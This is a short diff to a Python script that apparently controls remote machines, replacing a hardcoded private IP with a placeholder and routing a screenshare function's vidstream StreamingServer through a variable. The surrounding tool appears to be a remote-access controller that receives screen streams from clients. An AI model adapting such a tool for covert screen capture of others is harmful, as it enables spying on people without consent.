@@ -5,7 +5,7 @@ from vidstream import StreamingServer
 import threading
 import time
 
-ip = "192.168.178.59"
+ip = "private ipv4"
 port=8080
 restart = True
 
@@ -113,7 +113,7 @@ def screenshare(conn, command, sock):
     #conn.send(time.encode())
     sock.close()
     conn.close()
-    receiver = StreamingServer("192.168.178.59", 8080)
+    receiver = StreamingServer(ip, 8080)
     t = threading.Thread(target=receiver.start_server)
     t.start()
     time.sleep(15)
